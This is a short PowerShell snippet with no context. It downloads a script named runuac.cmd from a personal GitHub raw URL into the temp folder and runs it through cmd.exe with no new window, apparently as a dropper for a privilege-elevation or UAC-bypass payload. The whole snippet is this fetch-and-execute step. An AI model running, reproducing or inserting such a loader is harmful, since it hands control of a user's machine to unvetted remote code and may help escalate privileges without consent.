Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/runuac.cmd" -OutFile "$temp\runuac.cmd"
$process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $temp\runuac.cmd" -PassThru -NoNewWindow
$process.WaitForExit()
